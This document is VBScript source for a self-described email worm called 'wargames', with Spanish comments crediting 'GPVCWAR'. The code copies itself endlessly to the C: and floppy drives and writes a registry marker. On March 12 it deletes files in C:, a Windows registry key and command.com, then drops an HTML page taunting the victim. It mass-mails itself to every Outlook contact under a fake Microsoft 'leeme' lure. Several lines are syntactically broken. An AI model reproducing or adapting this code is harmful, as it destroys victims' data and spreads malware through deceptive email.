'Creado en Marruecos por GPVCWAR
'GPVCWAR te felicito, wargames!!!
On Error Resume Next

Set grone = CreateObject("scripting.filesystemobject")
Set a = CreateObject("scripting.filesystemobject")
Set o = CreateObject("scripting.filesystemobject")
Do
Randomize
kuasa = Int(Rnd * 5)
If kuasa = "0" Then Name = "war"
If kuasa = "1" Then Name = "games"
If kuasa = "2" Then Name = "loco"
If kuasa = "3" Then Name = "Brendano"
If kuasa = "4" Then Name = "Readme"
grone.copyfile ".\leeme.vbs", "c:\" & Name & ".vbs"
a.copyfile ".\leeme.vbs", "a:\" & Name & ".vbs"
Loop
o.copyfile ".\leeme.vbs", "c:\leeme.vbs"
Set regdel = CreateObject("wscript.shell")
Set reg = CreateObject("wscript.shell")
reg.regwrite "HKEY_CURRENT_USER\Software\GPVCWAR", "c:\leeme.vbs"
Set m = CreateObject("wscript.shell")
If m.RegRead "HKEY_CURRENT_USER\Software\GPVCWAR"
GoTo "mail()"
End If
Set del = CreateObject("scripting.filesystemobject")
If (Month()) = 3 And (Day()) = 12 Then
del.deletefile = "c:\*.*"
regdel.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion"
Set Page = CreateObject("wscript.shell")
Page.Run "http:// "
Set Command = CreateObject("scripting.filesystemobject")
Command.deletefile "c:\command.com"
Set textfile = CreateObject("scripting.filesystemobject")
Set contenido = textfile.createtextfile("c:\Informacion.html)", True)
contenido.writeline "<html>"
contenido.writeline "<head>"
contenido.writeline "<title>Ésta es la página del virus wargames, Vous avez entrez a la page du virus wargames, This is the webpage of the wargames virus</title>"
contenido.writeline "<script>"
contenido.writeline "<!--"
contenido.writeline "document.write('<h5>Hola, Hello, Bonjour et Bonsoir </h5>')"
contenido.writeline "document.write('<h3><p>Estás infectado por el virus wargames<p><p>You are infected by the wargames virus<p> Monsieur, vous êtes infecteés avec le virus wargames!</h4>')"
contenido.writeline "//-->"
contenido.writeline "</script>"
contenido.writeline "<script>"
contenido.writeline "<!--"
contenido.writeline "function gpvcwar()"
contenido.writeline "alert('Hola, te escribo para que sepas que estás infectado con el virus wargames')"
contenido.writeline "alert('Qué bueno no?')"
contenido.writeline "alert('Te recomiendo que leas toda la web')"
contenido.writeline "</head>"
contenido.writeline "<body onload=gpvcwar()>"
contenido.writeline "<marquee> Hey you all, you have been infected with the wargames virus so you can´t get rid of it unless you are very clever</marquee>"
contenido.writeline "<marquee> A todos ustedes, fueron infectados con el virus wargames así que solamente si son muy inteligentes se van a poder deshacer de él</marquee>"
contenido.writeline "<marquee> A toût le monde, vous êtes infecteés avec le virus wargames... Vous ne suis capables de la destructión de il...</marquee>"
contenido.writeline "<font face=comic sans><h3>¡¡¡Atención!!! Para todos los que dicen que ésto no es un virus y es un worm tienen razón...</h3></font>"
contenido.writeline "<font color=red> Con ésto me despido...</font>"
contenido.writeline "<blink>Saludos a todos, GPVCWar</blink>"
contenido.writeline "</body>"
contenido.writeline "</html>"
contenido.Close
Function mail()
On Error Resume Next
Set outlook = CreateObject("Outlook.Application")
If outlook = "Outlook" Then
Set mapi = outlook.GetNameSpace("MAPI")
Set addresses = mapi.AddressLists
For Each Address In addresses
If Address.AddressEntries.Count <> 0 Then
Count = Address.AddressEntries.Count
For I = 1 To Count
Set email = outlook.CreateItem(0)
Set entry = Address.AddressEntries(I)
email.To = entry.Address
email.Subject = "Here you have, ;o)"
email.Body = "Hola:<p>"
Cómo estás? Te mando el leeme del microsoft que te va a servir... <p>saludos <p>Ricardo"
Set attachment = email.Attachments
attachment.Add "c:\leeme.vbs"
email.DeleteAfterSubmit = True
If email.To <> "" Then
email.Send
shellobject.regwrite "HKEY_CURRENT_USER\Software\GPVCWAR", "Fue enviado"
1 mail ""
End If
Next

End Function
End Function            

Function x(je)
For loco = 1 To Len(je)
x = x & Chr(Asc(Mid(je, loco, 1)) Xor Len("ton"))
Next
End Function
